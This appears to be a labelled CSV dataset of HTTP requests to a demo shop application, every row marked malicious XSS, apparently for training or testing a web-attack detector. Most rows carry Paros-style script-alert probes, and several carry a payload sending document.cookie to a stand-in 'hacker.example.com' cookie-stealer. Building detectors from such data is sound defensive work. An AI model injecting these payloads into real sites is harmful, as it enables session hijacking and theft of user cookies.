method,url,protocol,headers,body,label,attack_type
POST,/tienda1/publico/entrar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=87AB4C0A30EE26A57656DF5C4F8FE6CF', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 73'}",errorMsg=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,malicious,xss
GET,/tienda1/publico/autenticar.jsp?modo=entrar%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&login=van_kess&pwd=3ran48&remember=on&B1=Entrar,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=69A2C76B6E0893DF7BD4207979903198', 'Connection': 'close'}",,malicious,xss
POST,/tienda1/publico/entrar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=ACEDDFA3BED3C669F68D375477E04986', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 97'}",errorMsg=Credenciales+incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,malicious,xss
GET,/tienda1/miembros/editar.jsp?modo=registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&login=widuch&password=o7TOp%E9dIca&nombre=Belindo&apellidos=Calet&email=gassman%40itrends.gs&dni=54927886E&direccion=Memorial+Nu%F1ez+Blanca+193%2C+&ciudad=Madridanos&cp=37060&provincia=Teruel&ntc=0916374019101201&B1=Registrar,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=1428C0B291114BE3069778C24947ADF9', 'Connection': 'close'}",,malicious,xss
GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=9805&B1=Pasar+por+caja%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=D26C49FFD0EC3E9BBAFD000A01EFA260', 'Connection': 'close'}",,malicious,xss
POST,/tienda1/publico/caracteristicas.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=B27D0E802D556D72D8ACA0D08C1DA0B7', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 67'}",id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,malicious,xss
POST,/tienda1/miembros/editar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=3E9E563D30E7DDDACF4260A83D98B63F', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 292'}",modo=registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&login=widuch&password=o7TOp%E9dIca&nombre=Belindo&apellidos=Calet&email=gassman%40itrends.gs&dni=54927886E&direccion=Memorial+Nu%F1ez+Blanca+193%2C+&ciudad=Madridanos&cp=37060&provincia=Teruel&ntc=0916374019101201&B1=Registrar,malicious,xss
GET,/tienda1/publico/caracteristicas.jsp?id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=24F996590F1901895CED6D55B5AE8661', 'Connection': 'close'}",,malicious,xss
GET,/tienda1/publico/registro.jsp?modo=registro&login=haylock&password=zANgaRulL%D3N&nombre=Eleuterio&apellidos=Acevedo+Cantonati&email=kuzuoglu5%40nomao.iq&dni=43751597P&direccion=C%2F+Maria+Moliner+48+&ciudad=Ojos+Negros&cp=10160&provincia=Salamanca&ntc=0358024000873525bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Registrar,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=AD3B49D003E282AFB812C282ECC31143', 'Connection': 'close'}",,malicious,xss
GET,/tienda1/publico/vaciar.jsp?B2=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=2B38BC053EC971570B96A2A81FDB0270', 'Connection': 'close'}",,malicious,xss
POST,/tienda1/publico/pagar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=8B99D183ED24953EB23E2284C67DD93D', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 95'}",modo=insertar&precio=9805&B1=Pasar+por+caja%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,malicious,xss
GET,/tienda1/miembros/editar.jsp?modo=registro&login=michial3&password=83o3i7a374&nombre=Teodomira&apellidos=D%27Paoli+Garros&email=bessell%40ttivoni.is&dni=32124292Psessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&direccion=C%2F+Montevideo+193%2C+&ciudad=Rupi%E0&cp=39572&provincia=Burgos&ntc=8086742983774365&B1=Registrar,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=A623AEF52FC7B9D3189627C7BE0E5641', 'Connection': 'close'}",,malicious,xss
GET,/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=A%F1adir+al+carrito,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=410A7B95B295F0C3F372FC95F7F6D625', 'Connection': 'close'}",,malicious,xss
GET,/tienda1/publico/caracteristicas.jsp?id=2sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=B0D4203C76E2F6AF4E406AACFB9A36DC', 'Connection': 'close'}",,malicious,xss
POST,/tienda1/publico/entrar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=D6241E80E5118177940409CD911BD8E7', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 61'}",errorMsg=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,malicious,xss
POST,/tienda1/publico/anadir.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=87BA2CEDD7B0BACC557EE2AE2875F2FE', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 160'}",id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=80&B1=A%F1adir+al+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,malicious,xss
GET,/tienda1/publico/entrar.jsp?errorMsg=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=4B794ED5E7EADF1EE63DC3FF73EFD933', 'Connection': 'close'}",,malicious,xss
GET,/tienda1/publico/registro.jsp?modo=registro&login=yank&password=tr4n52r&nombre=Ferreol&apellidos=Vilamitj%E0+Ponce&email=devlin_lazar%40joyaseleccion.tk&dni=93119033Z&direccion=Calle+Marques+De+Pontejos+170+&ciudad=Molar%2C+El&cp=44721bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&provincia=Badajoz&ntc=5418660256451813&B1=Registrar,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=B8870A601873D9062D4FC548453BA2A3', 'Connection': 'close'}",,malicious,xss
POST,/tienda1/publico/pagar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=90FE1D4AD5D3438CC6ED32B2EB3867A6', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 199'}",modo=insertar&precio=4014&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,malicious,xss
POST,/tienda1/publico/pagar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=BE6C25AD8E0CAB6CB0352058C80F5F95', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 128'}",modo=insertarparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&precio=5514&B1=Pasar+por+caja,malicious,xss
GET,/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=EEFBD962233F59EDAD275BAA5783709A', 'Connection': 'close'}",,malicious,xss
GET,/tienda1/publico/anadir.jsp?id=2bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&nombre=Vino+Rioja&precio=100&cantidad=21&B1=A%F1adir+al+carrito,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=FC836834D2E566E1DE80622200CE1C1B', 'Connection': 'close'}",,malicious,xss
GET,/tienda1/publico/caracteristicas.jsp?id=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=347D3AB58B5B7202F1A248B18A07C1A2', 'Connection': 'close'}",,malicious,xss
POST,/tienda1/publico/anadir.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=7AD788DA29A5610266CBA7CE481B4C6E', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 126'}",id=2&nombre=Jam%F3n+Ib%E9rico%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&precio=39&cantidad=81&B1=A%F1adir+al+carrito,malicious,xss
GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=northrop&pwd=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&remember=on&B1=Entrar,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=16A65E155417A2B62E3E51E712FD22DA', 'Connection': 'close'}",,malicious,xss
POST,/tienda1/publico/registro.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=8BBC253CB0E45FD55E0EF5EDF4178E21', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 441'}",modo=registrosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&login=paxton&password=e4TE9ADa&nombre=Hermelinda&apellidos=Llorente+Batllori&email=kawazu3%40alquilerpantallasled.org&dni=79540644C&direccion=Cami%F1o+Dentagron+68%2C+&ciudad=San+Mart%EDn+del+R%EDo&cp=33909&provincia=Teruel&ntc=3393638948319901&B1=Registrar,malicious,xss
POST,/tienda1/publico/autenticar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=E74DCA75281363E5B9DD5C818DFA610C', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 125'}",modo=entrar&login=bowden&pwd=mel-enerabob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&remember=off&B1=Entrar,malicious,xss
GET,/tienda1/publico/caracteristicas.jsp?id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=AC3D986D114E2D4B41728449F032E714', 'Connection': 'close'}",,malicious,xss
POST,/tienda1/publico/pagar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=169A4DF1BF8D4B354401EDD5BD720D48', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 208'}",modo=insertar&precio=6908&B1=Confirmarsessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,malicious,xss
POST,/tienda1/publico/caracteristicas.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=DB43C89712B5A8467064FD2D768AEEB4', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 55'}",id=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,malicious,xss
